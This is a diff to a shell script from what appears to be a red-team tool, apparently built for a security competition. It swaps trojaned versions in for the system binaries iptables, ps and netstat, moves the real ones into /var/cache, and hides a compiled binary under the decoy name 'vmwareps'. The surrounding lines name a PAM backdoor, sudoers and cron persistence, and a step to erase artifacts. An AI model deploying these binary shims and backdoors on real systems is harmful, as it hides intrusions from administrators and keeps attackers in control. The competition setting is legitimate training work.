@@ -84,12 +84,12 @@ cronjob(){
 }
 
 # Shim iptables. IPtables had weird symlink, had to separate it 
-iptables(){
+shim_iptables(){
     echo -e "\nShimming iptables... \n"
     gcc /opt/cdt-redteamtool/payload/iptables/drop.c -o /opt/cdt-redteamtool/payload/iptables/drop
     cp /opt/cdt-redteamtool/payload/iptables/drop /bin/fw
     cp /opt/cdt-redteamtool/payload/iptables/iptables /sbin/xtables-single 
-    chmod 777 /sbin/xtables-single
+    chmod 755 /sbin/xtables-single
 
     xtables=`which iptables`
     ln -sf /sbin/xtables-single $xtables
@@ -99,18 +99,28 @@ shim_ps(){
     echo -e "\nShimming ps... \n"
 
     gcc /opt/cdt-redteamtool/payload/ps/drop_ps.c -o /bin/procs
-    chmod 777 /bin/procs
+    chmod 755 /bin/procs
     mv /bin/ps /var/cache/ps
     cp /opt/cdt-redteamtool/payload/ps/ps /bin/ps
-    chmod 777 /bin/ps
-
-
+    chmod 755 /bin/ps
 }
 
-# Shim rest of the binaries; ps, netstat, cd 
-#shim() {
-#
-#}
+
+# Need to add a shim for netstat 
+shim_netstat() {
+	echo -e "\nShimming netstat... \n"
+	gcc /opt/cdt-redteamtool/payload/netstat/drop_netstat.c -o /bin/vmwareps
+	chmod 755 /bin/vmwareps
+
+	mv /bin/netstat /var/cache/netstat 
+	mv /usr/bin/netstat /var/cache/netstat 
+
+	cp /opt/cdt-redteamtool/payload/netstat/netstat /usr/bin/netstat 
+	cp /opt/cdt-redteamtool/payload/netstat/netstat /bin/netstat 
+
+	chmod 755 /bin/netstat 
+	chmod 755 /usr/bin/netstat 
+}
 
 # PAM backdoor 
 pam(){
@@ -142,8 +152,9 @@ sudoers
 cronjob
 pam
 bashrc  
-iptables
+shim_iptables
 shim_ps
+shim_netstat
 echo -e "========= Script have ended. Erase all artifaces. ========== \n"
 
 # Start copyman 
